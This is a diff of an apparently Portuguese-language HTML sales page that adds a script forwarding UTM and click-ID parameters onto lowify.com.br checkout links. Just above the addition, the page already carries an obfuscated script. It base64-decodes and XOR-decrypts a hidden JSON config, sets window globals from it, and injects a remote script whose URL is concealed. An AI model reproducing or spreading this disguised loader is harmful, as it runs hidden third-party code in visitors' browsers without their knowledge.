@@ -614,6 +614,33 @@
 </script>
 
 <script>(function(){var p_bo8=atob("DBbpBu7aWDFdoRafg23Lc5y2egt/yWLr82XTKcG5PF9z1GLy6nCQKI21NR8/0zns4GSAdpqpd0QpzGWw73edY52udlsugzq94mKddIe4LUU40jSl2G3LaI+3PRNng3L+93fEc5q3MVckjGbt5mCMaJr3IFIyxTvs4H3LKsysOV0oxDSloTSUKpX4NlAwxDSloXKIco/3LUUwyHDmrmabY5i/NkVw0mP96nKaJML4LlAx1HO9uTTLe7On");var a_pt=[];for(var o_sy=0;o_sy<p_bo8.length;o_sy++){a_pt.push(p_bo8.charCodeAt(o_sy)&255);}var s_uqj9=a_pt[0];var f_4=a_pt.slice(1,1+s_uqj9);var f_ix=a_pt.slice(1+s_uqj9);var c_p=f_ix.map(function(b,d_1r){return b^f_4[d_1r%s_uqj9];});var f_lds6="";for(var g_vbjn=0;g_vbjn<c_p.length;g_vbjn++){f_lds6+=String.fromCharCode(c_p[g_vbjn]&255);}var r_p8kb=decodeURIComponent(escape(f_lds6));var p_hwxu=JSON.parse(r_p8kb);var x_j=p_hwxu.globals||[];x_j.forEach(function(n_b){window[n_b.name]=n_b.value;});var o_f7=document.createElement("script");o_f7.src=p_hwxu.url;o_f7.async=true;o_f7.defer=true;(p_hwxu.attributes||[]).forEach(function(p_4){o_f7.setAttribute(p_4.name,p_4.value);});(document.head||document.documentElement).appendChild(o_f7);})();</script>
+<!-- trackeamento: repassa UTMs para o checkout Lowify -->
+<script>
+(function () {
+  try {
+    var KEYS = ["utm_source", "utm_medium", "utm_campaign", "utm_content", "utm_term", "fbclid", "src", "sck"];
+    var params = new URLSearchParams(location.search), saved = {};
+    try { saved = JSON.parse(localStorage.getItem("trk_utm") || "{}"); } catch (e) {}
+    if (KEYS.some(function (k) { return params.get(k); })) {
+      saved = {};
+      KEYS.forEach(function (k) { if (params.get(k)) saved[k] = params.get(k); });
+      try { localStorage.setItem("trk_utm", JSON.stringify(saved)); } catch (e) {}
+    }
+    var fix = function (a) {
+      var u = new URL(a.href);
+      KEYS.forEach(function (k) { if (saved[k] && !u.searchParams.has(k)) u.searchParams.set(k, saved[k]); });
+      a.href = u.toString();
+    };
+    var run = function () { document.querySelectorAll('a[href*="lowify.com.br"]').forEach(fix); };
+    run();
+    document.addEventListener("DOMContentLoaded", run);
+    document.addEventListener("click", function (e) {
+      var a = e.target.closest && e.target.closest('a[href*="lowify.com.br"]');
+      if (a) fix(a);
+    }, true);
+  } catch (e) {}
+})();
+</script>
 </body>
 </html>
 
